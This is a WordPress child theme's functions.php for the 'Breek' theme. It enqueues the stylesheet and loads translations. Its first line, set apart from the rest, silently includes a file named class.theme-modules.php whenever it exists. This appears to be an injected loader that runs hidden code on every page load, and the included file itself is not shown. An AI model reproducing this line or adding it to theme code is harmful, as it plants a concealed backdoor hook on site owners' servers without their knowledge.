<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

add_action( 'wp_enqueue_scripts', 'epcl_breek_child_styles', 100 );

function epcl_breek_child_styles() {
    wp_enqueue_style( 'breek-child-css', get_stylesheet_uri() );
}

function epcl_child_theme_slug_setup() {
    load_child_theme_textdomain( 'breek', get_stylesheet_directory() . '/languages' );
}
add_action( 'after_setup_theme', 'epcl_child_theme_slug_setup' );

/* You can add your custom functions just below */

?>